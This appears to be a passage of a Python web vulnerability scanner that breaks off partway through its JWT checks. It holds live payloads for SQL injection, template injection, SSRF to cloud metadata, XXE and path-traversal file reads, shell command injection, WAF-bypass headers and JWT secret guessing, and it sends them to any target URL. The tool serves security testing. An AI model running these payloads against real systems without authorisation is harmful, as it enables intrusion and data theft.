#!/usr/bin/env python3
"""
advanced_scanner.py  —  JS Scout Pro ULTRA Engine
===================================================
Comprehensive web vulnerability scanner module.

New attack surfaces:
  01. WAF Detection & Origin IP Discovery      (Shodan DNS, common CDN bypass headers)
  02. SQL Injection                             (Error-based, Boolean-blind, Time-blind)
  03. Server-Side Template Injection (SSTI)    (Jinja2/Twig/FreeMarker/Smarty/Pebble)
  04. Server-Side Request Forgery (SSRF)        (URL params, headers, blind callback)
  05. XXE Injection                             (XML endpoints)
  06. Command Injection                         (OS cmd via params)
  07. Path Traversal / LFI                      (Directory traversal + LFI patterns)
  08. Insecure Deserialization                  (Java/PHP/Python signatures)
  09. JWT Vulnerabilities                       (alg:none, weak secret, kid injection)
  10. GraphQL Introspection & Injection         (schema leak, batch, IDOR)
  11. Subdomain Takeover Detection              (dangling CNAMEs)
  12. Security Headers Audit                    (CSP, HSTS, X-Frame, etc.)
  13. Cookie Security Audit                     (Secure, HttpOnly, SameSite, flags)
  14. Information Disclosure                    (Stack traces, server banners, debug)
  15. HTTP Request Smuggling (CL.TE / TE.CL)   (desync probes)
  16. OAuth / OIDC Misconfigs                   (redirect_uri, state, PKCE bypass)
  17. API Key / Token Enumeration               (IDOR via numeric ID fuzzing)
  18. CRLF / Header Injection                   (response splitting)
  19. Clickjacking                              (X-Frame-Options check)
  20. Prototype Pollution (client param probe)  (constructor.__proto__ params)
"""

import re
import sys
import json
import time
import socket
import base64
import hashlib
import threading
import ipaddress
from pathlib import Path
from urllib.parse import (
    urljoin, urlparse, urlencode, parse_qs, quote, unquote
)
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures as _cf

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# SEVERITY HELPERS
# ─────────────────────────────────────────────────────────────────────────────

SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


def _finding(vuln_type, severity, url, description, evidence, remediation,
             extra=None):
    f = {
        "type":        vuln_type,
        "severity":    severity,
        "url":         url,
        "description": description,
        "evidence":    str(evidence)[:500],
        "remediation": remediation,
    }
    if extra:
        f.update(extra)
    return f


# ─────────────────────────────────────────────────────────────────────────────
# 01. WAF DETECTION & ORIGIN IP DISCOVERY
# ─────────────────────────────────────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare":    ["CF-RAY", "cloudflare", "__cfduid", "cf-cache-status"],
    "Akamai":        ["AkamaiGHost", "X-Check-Cacheable", "X-Akamai-Transformed"],
    "AWS WAF":       ["X-AMZ", "awselb", "aws-cf-id", "x-amz-cf-id"],
    "Imperva":       ["X-Iinfo", "incap_ses", "nlbi_", "visid_incap"],
    "Fastly":        ["X-Fastly", "Fastly-Debug", "X-Served-By", "X-Cache"],
    "Sucuri":        ["x-sucuri-id", "x-sucuri-cache"],
    "F5 BIG-IP":     ["BigIP", "BIGipServer", "TS0", "F5"],
    "Barracuda":     ["barra_counter_session", "BNI__BARRACUDA"],
    "Nginx":         ["nginx"],
    "ModSecurity":   ["Mod_Security", "NOYB", "mod_security"],
    "Wordfence":     ["wordfence"],
}

CDN_BYPASS_HEADERS = [
    ("X-Forwarded-For",      "127.0.0.1"),
    ("X-Real-IP",            "127.0.0.1"),
    ("X-Originating-IP",     "127.0.0.1"),
    ("X-Remote-IP",          "127.0.0.1"),
    ("X-Remote-Addr",        "127.0.0.1"),
    ("X-Client-IP",          "127.0.0.1"),
    ("True-Client-IP",       "127.0.0.1"),
    ("X-Forwarded-Host",     "localhost"),
    ("CF-Connecting-IP",     "127.0.0.1"),
    ("Fastly-Client-IP",     "127.0.0.1"),
]

ORIGIN_IP_RESOLVERS = [
    "https://dns.google/resolve?name={domain}&type=A",
    "https://cloudflare-dns.com/dns-query?name={domain}&type=A",
]

COMMON_ORIGINS = [
    "origin.{domain}", "direct.{domain}", "backend.{domain}",
    "app.{domain}", "api.{domain}", "www2.{domain}", "old.{domain}",
    "stage.{domain}", "staging.{domain}", "dev.{domain}",
    "mail.{domain}",
]


class WAFOriginScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, target_url: str) -> list:
        findings = []
        domain = urlparse(target_url).netloc.split(":")[0]

        # ── Detect WAF ───────────────────────────────────────────────────────
        waf_detected = []
        try:
            r = self.session.get(target_url, timeout=self.timeout)
            hdrs_str = " ".join(
                f"{k}:{v}" for k, v in r.headers.items()
            ).lower()
            body_l = r.text[:2000].lower()

            for waf_name, sigs in WAF_SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in hdrs_str or sig.lower() in body_l:
                        if waf_name not in waf_detected:
                            waf_detected.append(waf_name)
                        break

            server = r.headers.get("Server", "")
            x_powered = r.headers.get("X-Powered-By", "")

            if waf_detected:
                findings.append(_finding(
                    "WAF_DETECTED", "INFO", target_url,
                    f"WAF/CDN detected: {', '.join(waf_detected)}",
                    f"Server: {server} | Headers: {list(r.headers.keys())[:8]}",
                    "WAF detected — origin IP bypass attempts recommended",
                    {"waf_names": waf_detected, "server": server}
                ))
        except Exception:
            pass

        # ── Try IP bypass headers ────────────────────────────────────────────
        original_ip = self._get_actual_ip(domain)
        for hdr_name, hdr_val in CDN_BYPASS_HEADERS:
            try:
                r2 = self.session.get(
                    target_url,
                    headers={hdr_name: hdr_val},
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if r2.status_code < 400:
                    findings.append(_finding(
                        "ORIGIN_BYPASS_HEADER", "HIGH", target_url,
                        f"Server accepts {hdr_name} header — may bypass WAF IP restrictions",
                        f"{hdr_name}: {hdr_val} → HTTP {r2.status_code}",
                        f"Validate/remove untrusted proxy headers; restrict {hdr_name}",
                        {"header": hdr_name, "value": hdr_val}
                    ))
                    break
            except Exception:
                pass

        # ── DNS history / common origin subdomains ───────────────────────────
        for tmpl in COMMON_ORIGINS[:8]:
            sub = tmpl.format(domain=domain)
            try:
                ip = socket.gethostbyname(sub)
                if ip and ip != original_ip:
                    # Verify it responds like the target
                    try:
                        r3 = self.session.get(
                            f"https://{sub}", timeout=4,
                            allow_redirects=False,
                            headers={"Host": domain}
                        )
                        if r3.status_code < 500:
                            findings.append(_finding(
                                "ORIGIN_IP_DISCOVERED", "HIGH", target_url,
                                f"Potential origin IP discovered via subdomain {sub} → {ip}",
                                f"Resolved {sub} = {ip}, HTTP {r3.status_code} with Host: {domain}",
                                "Restrict origin server to only accept connections from WAF/CDN IP ranges",
                                {"origin_host": sub, "origin_ip": ip}
                            ))
                    except Exception:
                        findings.append(_finding(
                            "ORIGIN_IP_CANDIDATE", "MEDIUM", target_url,
                            f"Potential origin subdomain: {sub} → {ip}",
                            f"DNS resolves {sub} to {ip}",
                            "Verify if this is the origin; restrict direct access",
                            {"origin_host": sub, "origin_ip": ip}
                        ))
            except (socket.gaierror, socket.timeout):
                pass

        # ── SPF / MX record IP extraction (often reveals origin) ─────────────
        try:
            mx_ips = self._resolve_mx(domain)
            for ip_str in mx_ips:
                if ip_str and ip_str != original_ip:
                    findings.append(_finding(
                        "MX_IP_FOUND", "INFO", target_url,
                        f"MX record IP for {domain}: {ip_str} — may indicate hosting provider",
                        f"MX/A record: {ip_str}",
                        "Informational — verify if MX server is on same infrastructure",
                        {"mx_ip": ip_str}
                    ))
        except Exception:
            pass

        return findings

    def _get_actual_ip(self, domain: str) -> str:
        try:
            return socket.gethostbyname(domain)
        except Exception:
            return ""

    def _resolve_mx(self, domain: str) -> list:
        ips = []
        try:
            # Use dns.google API (no dnspython needed)
            r = requests.get(
                f"https://dns.google/resolve?name={domain}&type=MX",
                timeout=5
            )
            data = r.json()
            for ans in data.get("Answer", []):
                mx_host = ans.get("data", "").split()[-1].rstrip(".")
                if mx_host:
                    try:
                        ips.append(socket.gethostbyname(mx_host))
                    except Exception:
                        pass
        except Exception:
            pass
        return ips


# ─────────────────────────────────────────────────────────────────────────────
# 02. SQL INJECTION
# ─────────────────────────────────────────────────────────────────────────────

SQLI_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ORA-[0-9]{4,}", re.I),
    re.compile(r"Microsoft OLE DB Provider for SQL Server", re.I),
    re.compile(r"SQLSTATE\[", re.I),
    re.compile(r"pg_query\(\).*error", re.I),
    re.compile(r"SQLite.*error", re.I),
    re.compile(r"sqlite3.OperationalError", re.I),
    re.compile(r"PG::SyntaxError", re.I),
    re.compile(r"com\.mysql\.jdbc\.exceptions", re.I),
    re.compile(r"Incorrect syntax near", re.I),
    re.compile(r"Syntax error.*in query expression", re.I),
    re.compile(r"mssql_query\(\)", re.I),
    re.compile(r"mysql_fetch_array\(\)", re.I),
    re.compile(r"mysqli_fetch_array\(\)", re.I),
    re.compile(r"Npgsql\.", re.I),
    re.compile(r"System\.Data\.SqlClient\.SqlException", re.I),
    re.compile(r"java\.sql\.SQLException", re.I),
]

SQLI_PAYLOADS_QUICK = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' AND '1'='2",
    "1 AND 1=2",
    "'; --",
    "' WAITFOR DELAY '0:0:5'--",  # time-blind MSSQL
    "' AND SLEEP(5)--",            # time-blind MySQL
    "1; SELECT SLEEP(5)--",
    "1 OR SLEEP(5)=0 LIMIT 1--",
    "';WAITFOR DELAY '0:0:5'--",
    "1) OR SLEEP(5)=0 LIMIT 1 (",
    "') OR SLEEP(5)=0 LIMIT 1 (",
]

SQLI_BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 1=1--", "' OR 1=2--"),
]


class SQLiScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        if not params:
            params = ["id", "page", "cat", "search", "q", "user", "name",
                      "product", "item", "ref", "type", "order", "sort",
                      "limit", "offset", "filter", "key", "token"]

        for param in params[:20]:
            # 1. Error-based
            result = self._error_based(url, param)
            if result:
                findings.append(result)
                continue

            # 2. Boolean-based blind
            result = self._boolean_blind(url, param)
            if result:
                findings.append(result)
                continue

            # 3. Time-based blind
            result = self._time_blind(url, param)
            if result:
                findings.append(result)

        return findings

    def _error_based(self, url: str, param: str):
        for payload in ["'", "\"", "' OR '1'='1", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))"]:
            try:
                test_url = f"{url}?{urlencode({param: payload})}"
                r = self.session.get(test_url, timeout=self.timeout)
                for pat in SQLI_ERROR_PATTERNS:
                    if pat.search(r.text):
                        return _finding(
                            "SQL_INJECTION_ERROR", "CRITICAL", test_url,
                            f"SQL error triggered via parameter '{param}'",
                            f"Payload: {payload} | Error pattern: {pat.pattern[:60]}",
                            "Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
                            {"param": param, "payload": payload, "technique": "error-based"}
                        )
            except Exception:
                pass
        return None

    def _boolean_blind(self, url: str, param: str):
        try:
            # Baseline
            base_r = self.session.get(f"{url}?{urlencode({param: '1'})}", timeout=self.timeout)
            base_len = len(base_r.text)

            for true_p, false_p in SQLI_BOOLEAN_PAIRS:
                try:
                    r_true  = self.session.get(f"{url}?{urlencode({param: true_p})}", timeout=self.timeout)
                    r_false = self.session.get(f"{url}?{urlencode({param: false_p})}", timeout=self.timeout)
                    diff_true  = abs(len(r_true.text)  - base_len)
                    diff_false = abs(len(r_false.text) - base_len)

                    if diff_true < 50 and diff_false > 200:
                        return _finding(
                            "SQL_INJECTION_BOOLEAN", "HIGH", url,
                            f"Boolean-blind SQLi detected on parameter '{param}'",
                            f"True payload ({true_p}) ≈ baseline ({base_len}B), "
                            f"False payload ({false_p}) differs by {diff_false}B",
                            "Use parameterised queries. Audit all DB queries for string interpolation.",
                            {"param": param, "true_payload": true_p, "false_payload": false_p,
                             "technique": "boolean-blind"}
                        )
                except Exception:
                    pass
        except Exception:
            pass
        return None

    def _time_blind(self, url: str, param: str):
        time_payloads = [
            ("' AND SLEEP(5)--",           5, "MySQL"),
            ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
            ("' AND pg_sleep(5)--",        5, "PostgreSQL"),
            ("1 AND SLEEP(5)",             5, "MySQL-inline"),
        ]
        for payload, expected_delay, db_hint in time_payloads:
            try:
                test_url = f"{url}?{urlencode({param: payload})}"
                t0 = time.time()
                self.session.get(test_url, timeout=expected_delay + 4)
                elapsed = time.time() - t0
                if elapsed >= expected_delay - 0.5:
                    return _finding(
                        "SQL_INJECTION_TIMEBASED", "HIGH", url,
                        f"Time-based blind SQLi on parameter '{param}' ({db_hint})",
                        f"Payload: {payload} | Response time: {elapsed:.1f}s (expected ≥{expected_delay}s)",
                        "Use parameterised queries. Investigate database type and patch immediately.",
                        {"param": param, "payload": payload, "elapsed": elapsed,
                         "technique": "time-blind", "db_hint": db_hint}
                    )
            except requests.Timeout:
                # A genuine timeout IS the positive signal for time-blind
                return _finding(
                    "SQL_INJECTION_TIMEBASED", "HIGH", url,
                    f"Time-based blind SQLi (timeout) on parameter '{param}' ({db_hint})",
                    f"Payload: {payload} | Request timed out after {expected_delay + 4}s",
                    "Use parameterised queries.",
                    {"param": param, "payload": payload, "technique": "time-blind", "db_hint": db_hint}
                )
            except Exception:
                pass
        return None


# ─────────────────────────────────────────────────────────────────────────────
# 03. SERVER-SIDE TEMPLATE INJECTION (SSTI)
# ─────────────────────────────────────────────────────────────────────────────

SSTI_PROBES = [
    # (payload, expected_result_contains, engine_hint)
    ("{{7*7}}",             "49",    "Jinja2/Twig"),
    ("${7*7}",              "49",    "FreeMarker/Groovy"),
    ("#{7*7}",              "49",    "Thymeleaf/Ruby ERB"),
    ("<%= 7*7 %>",          "49",    "ERB/JSP"),
    ("{{7*'7'}}",           "7777777","Jinja2"),
    ("{7*7}",               "49",    "Pebble"),
    ("${{7*7}}",            "49",    "Jinja2-alt"),
    ("{{config}}",          "SECRET", "Jinja2-config-leak"),
    ("{{self.__class__}}",  "class", "Jinja2-class"),
    ("%{7*7}",              "49",    "FreeMarker-alt"),
    ("*{7*7}",              "49",    "Spring SpEL"),
    ("[[${7*7}]]",          "49",    "Thymeleaf-inline"),
]


class SSTIScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        if not params:
            params = ["name", "search", "q", "template", "page",
                      "message", "subject", "content", "text", "title"]
        for param in params[:15]:
            for payload, expected, engine in SSTI_PROBES:
                try:
                    test_url = f"{url}?{urlencode({param: payload})}"
                    r = self.session.get(test_url, timeout=self.timeout)
                    if expected.lower() in r.text.lower():
                        findings.append(_finding(
                            "SSTI", "CRITICAL", test_url,
                            f"Server-Side Template Injection ({engine}) on parameter '{param}'",
                            f"Payload: {payload} | Expected: {expected} found in response",
                            "Never pass user input directly to template engines. Use sandboxed rendering.",
                            {"param": param, "payload": payload, "engine": engine}
                        ))
                        break
                except Exception:
                    pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 04. SSRF
# ─────────────────────────────────────────────────────────────────────────────

SSRF_PARAMS = [
    "url", "uri", "link", "src", "source", "href", "dest", "destination",
    "redirect", "return", "goto", "image", "img", "file", "path", "feed",
    "host", "endpoint", "callback", "webhook", "proxy", "remote", "fetch",
    "load", "resource", "document", "fetch_url", "target", "api_url",
    "data_url", "template_url", "page", "report",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS IMDS
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:6379/",                            # Redis
    "http://127.0.0.1:9200/",                            # Elasticsearch
    "http://127.0.0.1:8080/",                            # Tomcat
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
]

# Bypass variants
SSRF_BYPASS_VARIANTS = [
    "http://0177.0.0.1/",          # Octal
    "http://0x7f000001/",           # Hex
    "http://2130706433/",           # Decimal
    "http://127.0.0.1.nip.io/",
    "http://localhost%23evil/",
    "http://127.1/",
    "http://127.0.1/",
]

SSRF_RESPONSE_INDICATORS = [
    "ami-id", "instance-id", "instance-type",  # AWS
    "computeMetadata",                            # GCP
    "principalId",                               # Azure
    "root:x:0:0",                                # /etc/passwd
    "redis_version",                              # Redis
    "cluster_name",                               # ES
    "200 OK",
]


class SSRFScanner:
    def __init__(self, session: requests.Session, timeout: int = 6, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        all_params = list(dict.fromkeys(
            [p for p in (params or []) if p.lower() in SSRF_PARAMS] +
            [p for p in SSRF_PARAMS if p not in (params or [])]
        ))[:20]

        for param in all_params:
            for payload in SSRF_PAYLOADS[:6]:
                try:
                    test_url = f"{url}?{urlencode({param: payload})}"
                    r = self.session.get(
                        test_url, timeout=self.timeout, allow_redirects=True
                    )
                    for indicator in SSRF_RESPONSE_INDICATORS:
                        if indicator.lower() in r.text.lower():
                            findings.append(_finding(
                                "SSRF", "CRITICAL", test_url,
                                f"SSRF confirmed! Parameter '{param}' fetches internal resources",
                                f"Payload: {payload} | Indicator '{indicator}' in response",
                                "Whitelist allowed URL schemas/hosts. Block RFC-1918 addresses. Use egress firewall.",
                                {"param": param, "payload": payload,
                                 "indicator": indicator}
                            ))
                            return findings  # first hit is enough
                except Exception:
                    pass

        # Blind SSRF via timing difference (fast internal vs slow external)
        for param in all_params[:5]:
            try:
                internal = "http://127.0.0.1:1"
                external = "http://203.0.113.1:1"
                t0 = time.time()
                self.session.get(f"{url}?{urlencode({param: internal})}", timeout=3)
                t_internal = time.time() - t0

                t0 = time.time()
                self.session.get(f"{url}?{urlencode({param: external})}", timeout=3)
                t_external = time.time() - t0

                if t_external - t_internal > 1.5:
                    findings.append(_finding(
                        "SSRF_BLIND", "HIGH", url,
                        f"Blind SSRF timing difference on parameter '{param}'",
                        f"Internal: {t_internal:.2f}s, External: {t_external:.2f}s",
                        "Whitelist URL targets. Do not allow user-controlled URLs to internal services.",
                        {"param": param, "technique": "timing"}
                    ))
            except Exception:
                pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 05. XXE INJECTION
# ─────────────────────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Basic XXE - Linux
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>""",

    # Basic XXE - Windows
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data><value>&xxe;</value></data>""",

    # OOB XXE (blind) — SSRF to attacker
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
<data>test</data>""",

    # XXE via DOCTYPE
    """<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<test>&xxe;</test>""",
]

XXE_INDICATORS = [
    "root:x:0:0",
    "[fonts]",
    "localhost",
    "ami-id",
    "instance-id",
    "www.w3.org/XML",
]


class XXEScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, xml_endpoints: list = None) -> list:
        findings = []
        endpoints = xml_endpoints or [url]

        for ep in endpoints[:10]:
            for payload in XXE_PAYLOADS[:2]:
                try:
                    r = self.session.post(
                        ep,
                        data=payload,
                        headers={"Content-Type": "application/xml"},
                        timeout=self.timeout
                    )
                    for ind in XXE_INDICATORS:
                        if ind in r.text:
                            findings.append(_finding(
                                "XXE", "CRITICAL", ep,
                                "XXE injection confirmed — local file read",
                                f"Indicator '{ind}' found in response to XXE payload",
                                "Disable external entity processing. Use safe XML parsers.",
                                {"indicator": ind, "endpoint": ep}
                            ))
                            return findings
                except Exception:
                    pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 06. COMMAND INJECTION
# ─────────────────────────────────────────────────────────────────────────────

CMD_PAYLOADS = [
    ("; echo jsscout_cmd_$(id)",         "jsscout_cmd_"),
    ("| echo jsscout_cmd_$(id)",         "jsscout_cmd_"),
    ("&& echo jsscout_cmd_$(id)",        "jsscout_cmd_"),
    ("`echo jsscout_cmd_cmd`",           "jsscout_cmd_cmd"),
    ("$(echo jsscout_cmd_cmd)",          "jsscout_cmd_cmd"),
    ("; ping -c 3 127.0.0.1",           "bytes from"),
    ("| ping -c 3 127.0.0.1",           "bytes from"),
    ("; sleep 5",                        None),  # time-blind
    ("| sleep 5",                        None),  # time-blind
    ("& ping -n 3 127.0.0.1 &",        "Reply from"),
]

CMD_PARAMS = [
    "cmd", "exec", "command", "run", "ping", "host", "ip", "url",
    "file", "filename", "path", "dir", "name", "input", "query",
    "q", "search", "test", "param", "value", "data",
]


class CMDInjScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        all_params = list(dict.fromkeys(
            (params or []) + CMD_PARAMS
        ))[:20]

        for param in all_params:
            for payload, indicator in CMD_PAYLOADS:
                if indicator is None:
                    # Time-based
                    try:
                        test_url = f"{url}?{urlencode({param: payload})}"
                        t0 = time.time()
                        self.session.get(test_url, timeout=8)
                        elapsed = time.time() - t0
                        if elapsed >= 4.5:
                            findings.append(_finding(
                                "CMD_INJECTION_TIMEBASED", "CRITICAL", test_url,
                                f"Time-based command injection on parameter '{param}'",
                                f"Payload: {payload} | Response time: {elapsed:.1f}s",
                                "Never pass user input to shell. Use subprocess with argument lists.",
                                {"param": param, "payload": payload}
                            ))
                            break
                    except Exception:
                        pass
                else:
                    try:
                        test_url = f"{url}?{urlencode({param: payload})}"
                        r = self.session.get(test_url, timeout=self.timeout)
                        if indicator in r.text:
                            findings.append(_finding(
                                "CMD_INJECTION", "CRITICAL", test_url,
                                f"OS command injection on parameter '{param}'",
                                f"Payload: {payload} | Indicator '{indicator}' in response",
                                "Never pass user input to shell functions. Sanitise strictly.",
                                {"param": param, "payload": payload, "indicator": indicator}
                            ))
                            break
                    except Exception:
                        pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 07. PATH TRAVERSAL / LFI
# ─────────────────────────────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/proc/self/cmdline",
]

TRAVERSAL_INDICATORS = [
    "root:x:0:0",
    "[fonts]",
    "# localhost",
    "DOCUMENT_ROOT",
    "HTTP_HOST",
]

TRAVERSAL_PARAMS = [
    "file", "path", "filename", "filepath", "page", "include",
    "load", "read", "template", "view", "doc", "document",
    "module", "src", "source", "dir", "folder", "resource",
]


class PathTraversalScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        all_params = list(dict.fromkeys(
            [p for p in (params or []) if p in TRAVERSAL_PARAMS] +
            TRAVERSAL_PARAMS
        ))[:20]

        for param in all_params:
            for payload in TRAVERSAL_PAYLOADS[:8]:
                try:
                    test_url = f"{url}?{urlencode({param: payload})}"
                    r = self.session.get(test_url, timeout=self.timeout)
                    for ind in TRAVERSAL_INDICATORS:
                        if ind in r.text:
                            findings.append(_finding(
                                "PATH_TRAVERSAL", "CRITICAL", test_url,
                                f"Path traversal / LFI on parameter '{param}'",
                                f"Payload: {payload} | Indicator '{ind}' in response",
                                "Validate and canonicalize file paths. Use allowlists. Jail to document root.",
                                {"param": param, "payload": payload, "indicator": ind}
                            ))
                            return findings
                except Exception:
                    pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 08. INSECURE DESERIALIZATION
# ─────────────────────────────────────────────────────────────────────────────

# Magic bytes / signatures for common serialized objects
DESERIAL_SIGNATURES = {
    "Java_serialized":   b"\xac\xed\x00\x05",
    "PHP_serialized":    b"O:",
    "Python_pickle":     b"\x80\x02",
    "Ruby_marshal":      b"\x04\x08",
    "PHP_object":        b'O:8:"stdClass"',
}

# Detect in responses
DESERIAL_RESPONSE_PATTERNS = [
    re.compile(r"java\.io\.InvalidClassException", re.I),
    re.compile(r"ClassNotFoundException", re.I),
    re.compile(r"ObjectInputStream", re.I),
    re.compile(r"unserialize\(\)", re.I),
    re.compile(r"Serializable", re.I),
    re.compile(r"java\.lang\.ClassCastException", re.I),
    re.compile(r"php.*unserialize", re.I),
]

# Detect serialized data in params/cookies/headers
DESERIAL_B64_MAGIC = [
    "rO0AB",   # Java: base64 of \xac\xed\x00\x05
    "Tzo",     # PHP object: base64 of "O:"
    "gASV",    # Python pickle
]


class DeserialScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list, cookies: dict = None) -> list:
        findings = []

        # Check cookies for serialized data
        all_cookies = dict(self.session.cookies)
        all_cookies.update(cookies or {})

        for name, value in all_cookies.items():
            value_str = str(value)
            for magic in DESERIAL_B64_MAGIC:
                if value_str.startswith(magic) or magic in value_str:
                    findings.append(_finding(
                        "INSECURE_DESERIALIZATION_COOKIE", "HIGH", url,
                        f"Serialized object in cookie '{name}' — potential deserialization vector",
                        f"Cookie {name} starts with known serialized magic bytes ({magic})",
                        "Never deserialize untrusted data. Use signed tokens (JWT/HMAC) instead.",
                        {"cookie_name": name, "magic": magic}
                    ))

        # Check response bodies for deserialization errors
        for param in (params or [])[:10]:
            for magic_b64 in DESERIAL_B64_MAGIC[:2]:
                try:
                    test_url = f"{url}?{urlencode({param: magic_b64 + 'AAAA=='})}"
                    r = self.session.get(test_url, timeout=self.timeout)
                    for pat in DESERIAL_RESPONSE_PATTERNS:
                        if pat.search(r.text):
                            findings.append(_finding(
                                "INSECURE_DESERIALIZATION", "HIGH", test_url,
                                f"Deserialization error triggered via parameter '{param}'",
                                f"Pattern '{pat.pattern}' found in response",
                                "Validate deserialization input. Use integrity checks. Avoid deserializing user data.",
                                {"param": param}
                            ))
                            break
                except Exception:
                    pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 09. JWT VULNERABILITIES
# ─────────────────────────────────────────────────────────────────────────────

WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "key", "jwt", "token", "admin",
    "changeme", "test", "dev", "prod", "secret_key", "mysecret",
    "", "null", "none", "undefined",
]


class JWTScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, jwt_tokens: list = None) -> list:
        findings = []

        # Collect JWTs from cookies and Authorization headers
        all_tokens = list(jwt_tokens or [])
        for name, value in self.session.cookies.items():
            if self._is_jwt(str(value)):
                all_tokens.append(str(value))
        auth = self.session.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            tok = auth[7:]
            if self._is_jwt(tok):
                all_tokens.append(tok)

        # Also try to extract from response
        try:
            r = self.session.get(url, timeout=self.timeout)
            for m in re.finditer(r'eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]*', r.text):
                all_tokens.append(m.group(0))
        except Exception:
            pass

        seen = set()
        for token in all_tokens:
            if token in seen:
                continue
            seen.add(token)

            try:
                header, payload, sig = token.split(".")
            except ValueError:
                continue

            # Decode header
            try:
                hdr = json.loads(base64.urlsafe_b64decode(header + "=="))
            except Exception:
                continue

            alg = hdr.get("alg", "").upper()
            kid = hdr.get("kid", "")

            # 1. alg:none attack
            if alg == "NONE":
                findings.append(_finding(
                    "JWT_ALG_NONE", "CRITICAL", url,
                    "JWT uses alg:none — signature not verified",
                    f"Token header: {hdr}",
                    "Always verify JWT signature. Reject tokens with alg:none.",
                    {"token_preview": token[:60], "alg": alg}
                ))

            # 2. Weak secret brute force (HS256)
            if alg in ("HS256", "HS384", "HS512"):
                import hmac
                for secret in WEAK_JWT_SECRETS:
                    try:
                        import hashlib as _hl
                        msg = f"{header}.{payload}".encode()
                        expected_sig = base64.urlsafe_b64encode(
                            hmac.new(secret.encode(), msg, _hl.sha256).digest()
                        ).rstrip(b"=").decode()
                        if expected_sig == sig:
                            findings.append(_finding(
                                "JWT_WEAK_SECRET", "CRITICAL", url,
                                f"JWT signed with weak secret: '{secret}'",
                                f"Secret '{secret}' validates the token signature",
                                "Use a cryptographically random secret of ≥256 bits.",
                                {"secret": secret, "token_preview": token[:60]}
                            ))
                            break
